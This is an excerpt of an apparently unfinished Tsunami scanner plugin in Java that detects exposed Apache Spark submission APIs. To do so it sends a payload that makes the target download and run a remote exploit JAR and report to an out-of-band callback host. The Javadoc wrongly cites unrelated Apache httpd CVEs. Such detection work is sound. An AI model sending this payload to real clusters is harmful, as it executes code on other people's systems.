...
/** A {@link VulnDetector} that detects the TODO CVE-2021-41773 and CVE-2021-42013 vulnerability. */
@PluginInfo(
...
public class ApacheSparksExposedApiVulnDetector implements VulnDetector {
  ...
  private static String payload = "{\"action\":\"CreateSubmissionRequest\",\"clientSparkVersion\":\"1\",\"appArgs\":[\"%s\"],\"appResource\":\"%s\",\"environmentVariables\":{\"SPARK_ENV_LOADED\":\"1\"},\"mainClass\":\"Tsunami\",\"sparkProperties\":{\"spark.jars\":\"%s\",\"spark.driver.supervise\":\"false\",\"spark.app.name\":\"Tsunami\",\"spark.eventLog.enabled\":\"true\",\"spark.submit.deployMode\":\"cluster\",\"spark.master\":\"spark://localhost:6066\"}}";
private static final String JAR_PAYLOAD_URI = "https://github.com/timoles/tsunami-security-scanner-plugins/raw/exposed_spark_ui_and_api/payloads/community/apache_spark_exposed_api/Tsunami_Apache_Spark_Exploit.jar"; // TODO change github link
  @Inject
  ApacheSparksExposedApiVulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
  ...
  private CheckResult checkUrlWithCommonDirectory(
    ...
    String targetUri =
            NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "v1/submissions/create";
    try {
    	String finished_payload = String.format(payload, "https://kl9q5t25f7tf0kfqmdhgx9k9l0rvfl3a.cb.mogwailabs.de/aa", JAR_PAYLOAD_URI, JAR_PAYLOAD_URI); // TODO
      ...
      if (response.status() == HttpStatus.OK // TODO !!
          && body.isPresent()
  ...
  abstract static class CheckResult {
    ...
    static CheckResult buildForVulnerableDetection(
      ...
      return new AutoValue_ApacheSparksExposedApiVulnDetector_CheckResult(
